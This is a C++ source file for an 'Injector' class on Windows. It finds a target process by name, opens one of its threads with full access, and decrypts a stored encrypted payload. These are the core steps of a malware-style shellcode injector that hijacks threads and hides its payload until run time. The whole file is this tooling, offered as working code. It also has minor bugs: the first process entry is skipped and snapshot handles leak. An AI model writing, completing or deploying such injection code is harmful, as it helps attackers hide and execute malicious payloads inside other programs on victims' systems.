#include "Injector.h"

using namespace std;

DWORD Injector::FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    // create a snapshot of the currently running process.
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    // must be set when using snapshot.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // using PROCESSENTRY32 to iterate over the hanndle created by snapshot.
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            CloseHandle(hProcSnap);
            return pid;
        }
    }
    return 0;
}

HANDLE Injector::FindThread(DWORD pid){
    HANDLE snapshot, h_thread = nullptr;
    THREADENTRY32 th_entry;
    bool success;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    th_entry.dwSize = sizeof(th_entry);
    success = Thread32First(snapshot, &th_entry);
    while (success){
        if (th_entry.th32OwnerProcessID == pid){
            h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, th_entry.th32ThreadID);
            CloseHandle(snapshot);
            break;
        }
        success = Thread32Next(snapshot, &th_entry);
    }
    return h_thread;
}

void Injector::Decrypt(){
    this->dec_->Decrypt(payload_,payload_len_,key_,keylen_);
}
